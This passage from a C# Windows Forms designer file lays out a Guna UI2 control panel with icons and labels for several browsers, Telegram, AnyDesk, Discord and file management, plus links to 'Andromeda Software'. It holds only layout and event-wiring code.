            this.Panel_ControlPage.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Panel_ControlPage.ShadowDecoration.Enabled = true;
            this.Panel_ControlPage.Size = new System.Drawing.Size(715, 161);
            this.Panel_ControlPage.TabIndex = 146;
            // 
            // guna2PictureBox31
            // 
            this.guna2PictureBox31.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox31, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox31, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox31.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox31.Image")));
            this.guna2PictureBox31.ImageRotate = 0F;
            this.guna2PictureBox31.Location = new System.Drawing.Point(16, 55);
            this.guna2PictureBox31.Name = "guna2PictureBox31";
            this.guna2PictureBox31.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox31.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox31.TabIndex = 176;
            this.guna2PictureBox31.TabStop = false;
            this.guna2PictureBox31.UseTransparentBackground = true;
            // 
            // guna2PictureBox30
            // 
            this.guna2PictureBox30.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox30, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox30, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox30.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox30.Image")));
            this.guna2PictureBox30.ImageRotate = 0F;
            this.guna2PictureBox30.Location = new System.Drawing.Point(663, 55);
            this.guna2PictureBox30.Name = "guna2PictureBox30";
            this.guna2PictureBox30.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox30.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox30.TabIndex = 175;
            this.guna2PictureBox30.TabStop = false;
            this.guna2PictureBox30.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel48
            // 
            this.guna2HtmlLabel48.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel48, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel48, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel48.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel48.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel48.Location = new System.Drawing.Point(539, 96);
            this.guna2HtmlLabel48.Name = "guna2HtmlLabel48";
            this.guna2HtmlLabel48.Size = new System.Drawing.Size(65, 15);
            this.guna2HtmlLabel48.TabIndex = 174;
            this.guna2HtmlLabel48.Text = "File Manage";
            // 
            // guna2HtmlLabel47
            // 
            this.guna2HtmlLabel47.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel47, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel47, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel47.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel47.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel47.Location = new System.Drawing.Point(484, 96);
            this.guna2HtmlLabel47.Name = "guna2HtmlLabel47";
            this.guna2HtmlLabel47.Size = new System.Drawing.Size(42, 15);
            this.guna2HtmlLabel47.TabIndex = 173;
            this.guna2HtmlLabel47.Text = "Discord";
            // 
            // guna2HtmlLabel45
            // 
            this.guna2HtmlLabel45.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel45, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel45, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel45.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel45.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel45.Location = new System.Drawing.Point(426, 96);
            this.guna2HtmlLabel45.Name = "guna2HtmlLabel45";
            this.guna2HtmlLabel45.Size = new System.Drawing.Size(47, 15);
            this.guna2HtmlLabel45.TabIndex = 172;
            this.guna2HtmlLabel45.Text = "AnyDesk";
            // 
            // guna2HtmlLabel44
            // 
            this.guna2HtmlLabel44.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel44, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel44, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel44.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel44.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel44.Location = new System.Drawing.Point(366, 96);
            this.guna2HtmlLabel44.Name = "guna2HtmlLabel44";
            this.guna2HtmlLabel44.Size = new System.Drawing.Size(51, 15);
            this.guna2HtmlLabel44.TabIndex = 171;
            this.guna2HtmlLabel44.Text = "Telegram";
            // 
            // guna2PictureBox26
            // 
            this.guna2PictureBox26.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox26, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox26, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox26.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox26.Image")));
            this.guna2PictureBox26.ImageRotate = 0F;
            this.guna2PictureBox26.Location = new System.Drawing.Point(553, 55);
            this.guna2PictureBox26.Name = "guna2PictureBox26";
            this.guna2PictureBox26.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox26.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox26.TabIndex = 170;
            this.guna2PictureBox26.TabStop = false;
            this.guna2PictureBox26.UseTransparentBackground = true;
            // 
            // guna2PictureBox25
            // 
            this.guna2PictureBox25.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox25, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox25, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox25.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox25.Image")));
            this.guna2PictureBox25.ImageRotate = 0F;
            this.guna2PictureBox25.Location = new System.Drawing.Point(485, 55);
            this.guna2PictureBox25.Name = "guna2PictureBox25";
            this.guna2PictureBox25.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox25.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox25.TabIndex = 169;
            this.guna2PictureBox25.TabStop = false;
            this.guna2PictureBox25.UseTransparentBackground = true;
            // 
            // guna2PictureBox24
            // 
            this.guna2PictureBox24.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox24, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox24, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox24.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox24.Image")));
            this.guna2PictureBox24.ImageRotate = 0F;
            this.guna2PictureBox24.Location = new System.Drawing.Point(430, 55);
            this.guna2PictureBox24.Name = "guna2PictureBox24";
            this.guna2PictureBox24.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox24.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox24.TabIndex = 168;
            this.guna2PictureBox24.TabStop = false;
            this.guna2PictureBox24.UseTransparentBackground = true;
            // 
            // guna2PictureBox23
            // 
            this.guna2PictureBox23.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox23, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox23, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox23.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox23.Image")));
            this.guna2PictureBox23.ImageRotate = 0F;
            this.guna2PictureBox23.Location = new System.Drawing.Point(374, 55);
            this.guna2PictureBox23.Name = "guna2PictureBox23";
            this.guna2PictureBox23.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox23.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox23.TabIndex = 167;
            this.guna2PictureBox23.TabStop = false;
            this.guna2PictureBox23.UseTransparentBackground = true;
            // 
            // guna2PictureBox22
            // 
            this.guna2PictureBox22.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox22, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox22, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox22.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox22.Image")));
            this.guna2PictureBox22.ImageRotate = 0F;
            this.guna2PictureBox22.Location = new System.Drawing.Point(496, 127);
            this.guna2PictureBox22.Name = "guna2PictureBox22";
            this.guna2PictureBox22.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox22.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox22.TabIndex = 166;
            this.guna2PictureBox22.TabStop = false;
            this.guna2PictureBox22.UseTransparentBackground = true;
            // 
            // guna2PictureBox19
            // 
            this.guna2PictureBox19.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox19, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox19, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox19.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox19.Image")));
            this.guna2PictureBox19.ImageRotate = 0F;
            this.guna2PictureBox19.Location = new System.Drawing.Point(8, 127);
            this.guna2PictureBox19.Name = "guna2PictureBox19";
            this.guna2PictureBox19.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox19.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox19.TabIndex = 165;
            this.guna2PictureBox19.TabStop = false;
            this.guna2PictureBox19.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel43
            // 
            this.guna2HtmlLabel43.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel43, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel43, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel43.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel43.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel43.Location = new System.Drawing.Point(39, 133);
            this.guna2HtmlLabel43.Name = "guna2HtmlLabel43";
            this.guna2HtmlLabel43.Size = new System.Drawing.Size(193, 15);
            this.guna2HtmlLabel43.TabIndex = 164;
            this.guna2HtmlLabel43.Text = "https://t.me/Andromeda_Software_LTD";
            // 
            // guna2HtmlLabel42
            // 
            this.guna2HtmlLabel42.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel42, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel42, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel42.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel42.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel42.Location = new System.Drawing.Point(531, 133);
            this.guna2HtmlLabel42.Name = "guna2HtmlLabel42";
            this.guna2HtmlLabel42.Size = new System.Drawing.Size(167, 15);
            this.guna2HtmlLabel42.TabIndex = 159;
            this.guna2HtmlLabel42.Text = "https://andromedasoftware.com.br";
            // 
            // guna2PictureBox20
            // 
            this.guna2PictureBox20.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox20, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox20, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox20.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox20.Image")));
            this.guna2PictureBox20.ImageRotate = 0F;
            this.guna2PictureBox20.Location = new System.Drawing.Point(396, 3);
            this.guna2PictureBox20.Name = "guna2PictureBox20";
            this.guna2PictureBox20.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox20.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox20.TabIndex = 159;
            this.guna2PictureBox20.TabStop = false;
            this.guna2PictureBox20.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel41
            // 
            this.guna2HtmlLabel41.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel41, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel41, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel41.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel41.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel41.Location = new System.Drawing.Point(217, 96);
            this.guna2HtmlLabel41.Name = "guna2HtmlLabel41";
            this.guna2HtmlLabel41.Size = new System.Drawing.Size(39, 15);
            this.guna2HtmlLabel41.TabIndex = 163;
            this.guna2HtmlLabel41.Text = "Firefox";
            // 
            // guna2HtmlLabel40
            // 
            this.guna2HtmlLabel40.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel40, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel40, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel40.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel40.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel40.Location = new System.Drawing.Point(320, 96);
            this.guna2HtmlLabel40.Name = "guna2HtmlLabel40";
            this.guna2HtmlLabel40.Size = new System.Drawing.Size(34, 15);
            this.guna2HtmlLabel40.TabIndex = 162;
            this.guna2HtmlLabel40.Text = "Opera";
            // 
            // guna2HtmlLabel39
            // 
            this.guna2HtmlLabel39.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel39, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel39, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel39.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel39.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel39.Location = new System.Drawing.Point(271, 96);
            this.guna2HtmlLabel39.Name = "guna2HtmlLabel39";
            this.guna2HtmlLabel39.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel39.TabIndex = 161;
            this.guna2HtmlLabel39.Text = "Brave";
            // 
            // guna2HtmlLabel38
            // 
            this.guna2HtmlLabel38.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel38, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel38, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel38.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel38.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel38.Location = new System.Drawing.Point(171, 96);
            this.guna2HtmlLabel38.Name = "guna2HtmlLabel38";
            this.guna2HtmlLabel38.Size = new System.Drawing.Size(29, 15);
            this.guna2HtmlLabel38.TabIndex = 160;
            this.guna2HtmlLabel38.Text = "Edge";
            // 
            // guna2HtmlLabel37
            // 
            this.guna2HtmlLabel37.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel37, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel37, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel37.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel37.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel37.Location = new System.Drawing.Point(111, 96);
            this.guna2HtmlLabel37.Name = "guna2HtmlLabel37";
            this.guna2HtmlLabel37.Size = new System.Drawing.Size(43, 15);
            this.guna2HtmlLabel37.TabIndex = 159;
            this.guna2HtmlLabel37.Text = "Chrome";
            // 
            // guna2PictureBox17
            // 
            this.guna2PictureBox17.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox17, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox17, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox17.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox17.Image")));
            this.guna2PictureBox17.ImageRotate = 0F;
            this.guna2PictureBox17.Location = new System.Drawing.Point(321, 55);
            this.guna2PictureBox17.Name = "guna2PictureBox17";
            this.guna2PictureBox17.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox17.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox17.TabIndex = 104;
            this.guna2PictureBox17.TabStop = false;
            this.guna2PictureBox17.UseTransparentBackground = true;
            this.guna2PictureBox17.Click += new System.EventHandler(this.guna2PictureBox17_Click);
            // 
            // guna2PictureBox16
            // 
            this.guna2PictureBox16.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox16, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox16, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox16.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox16.Image")));
            this.guna2PictureBox16.ImageRotate = 0F;
            this.guna2PictureBox16.Location = new System.Drawing.Point(270, 55);
            this.guna2PictureBox16.Name = "guna2PictureBox16";
            this.guna2PictureBox16.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox16.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox16.TabIndex = 103;
            this.guna2PictureBox16.TabStop = false;
            this.guna2PictureBox16.UseTransparentBackground = true;
            this.guna2PictureBox16.Click += new System.EventHandler(this.guna2PictureBox16_Click);
            // 
            // guna2PictureBox15
            // 
            this.guna2PictureBox15.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox15.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox15.Image")));
            this.guna2PictureBox15.ImageRotate = 0F;
            this.guna2PictureBox15.Location = new System.Drawing.Point(217, 55);
            this.guna2PictureBox15.Name = "guna2PictureBox15";
            this.guna2PictureBox15.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox15.TabIndex = 102;
            this.guna2PictureBox15.TabStop = false;
            this.guna2PictureBox15.UseTransparentBackground = true;
            this.guna2PictureBox15.Click += new System.EventHandler(this.guna2PictureBox15_Click);
            // 
            // guna2PictureBox14
            // 
            this.guna2PictureBox14.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox14.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox14.Image")));
            this.guna2PictureBox14.ImageRotate = 0F;
            this.guna2PictureBox14.Location = new System.Drawing.Point(169, 55);
            this.guna2PictureBox14.Name = "guna2PictureBox14";
            this.guna2PictureBox14.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox14.TabIndex = 101;
            this.guna2PictureBox14.TabStop = false;
            this.guna2PictureBox14.UseTransparentBackground = true;
            this.guna2PictureBox14.Click += new System.EventHandler(this.guna2PictureBox14_Click_1);
            // 
            // Guna2HtmlLabel46
            // 
            this.Guna2HtmlLabel46.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel46, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel46, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel46.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel46.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.Guna2HtmlLabel46.Location = new System.Drawing.Point(293, 6);
            this.Guna2HtmlLabel46.Name = "Guna2HtmlLabel46";
            this.Guna2HtmlLabel46.Size = new System.Drawing.Size(100, 19);
            this.Guna2HtmlLabel46.TabIndex = 90;
            this.Guna2HtmlLabel46.Text = "Options manual";
            // 
            // Guna2PictureBox80
            // 
            this.Guna2PictureBox80.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox80, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox80, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox80.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox80.Image")));
            this.Guna2PictureBox80.ImageRotate = 0F;
            this.Guna2PictureBox80.Location = new System.Drawing.Point(116, 55);
            this.Guna2PictureBox80.Name = "Guna2PictureBox80";
            this.Guna2PictureBox80.Size = new System.Drawing.Size(35, 35);
            this.Guna2PictureBox80.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox80.TabIndex = 100;
            this.Guna2PictureBox80.TabStop = false;
            this.Guna2PictureBox80.UseTransparentBackground = true;
            this.Guna2PictureBox80.Click += new System.EventHandler(this.Guna2PictureBox80_Click);
            // 
            // guna2PictureBox18
            // 
            this.guna2PictureBox18.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox18.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox18, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox18, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox18.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox18.Image")));
            this.guna2PictureBox18.ImageRotate = 0F;
            this.guna2PictureBox18.Location = new System.Drawing.Point(-122, 449);
            this.guna2PictureBox18.Name = "guna2PictureBox18";
            this.guna2PictureBox18.Size = new System.Drawing.Size(405, 249);
            this.guna2PictureBox18.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox18.TabIndex = 167;
            this.guna2PictureBox18.TabStop = false;
            this.guna2PictureBox18.UseTransparentBackground = true;
            this.guna2PictureBox18.Visible = false;
            // 
            // Guna_Chrome
            // 
            this.Guna_Chrome.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Guna_Chrome.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna_Chrome, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna_Chrome, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna_Chrome.Image = ((System.Drawing.Image)(resources.GetObject("Guna_Chrome.Image")));
            this.Guna_Chrome.ImageRotate = 0F;
            this.Guna_Chrome.Location = new System.Drawing.Point(52, 50);
            this.Guna_Chrome.Name = "Guna_Chrome";
            this.Guna_Chrome.Size = new System.Drawing.Size(629, 361);
            this.Guna_Chrome.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna_Chrome.TabIndex = 147;
            this.Guna_Chrome.TabStop = false;
            this.Guna_Chrome.Click += new System.EventHandler(this.guna2PictureBox14_Click);
            // 
            // Guna_Edge
            // 
            this.Guna_Edge.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Guna_Edge.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna_Edge, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna_Edge, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna_Edge.Image = ((System.Drawing.Image)(resources.GetObject("Guna_Edge.Image")));
            this.Guna_Edge.ImageRotate = 0F;
            this.Guna_Edge.Location = new System.Drawing.Point(52, 50);
            this.Guna_Edge.Name = "Guna_Edge";
            this.Guna_Edge.Size = new System.Drawing.Size(629, 361);
            this.Guna_Edge.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna_Edge.TabIndex = 165;
            this.Guna_Edge.TabStop = false;
            this.Guna_Edge.Visible = false;
            // 
            // Guna_Firefox
            // 
            this.Guna_Firefox.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Guna_Firefox.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna_Firefox, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna_Firefox, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna_Firefox.Image = ((System.Drawing.Image)(resources.GetObject("Guna_Firefox.Image")));
            this.Guna_Firefox.ImageRotate = 0F;
            this.Guna_Firefox.Location = new System.Drawing.Point(52, 50);
            this.Guna_Firefox.Name = "Guna_Firefox";
            this.Guna_Firefox.Size = new System.Drawing.Size(629, 361);
            this.Guna_Firefox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna_Firefox.TabIndex = 149;
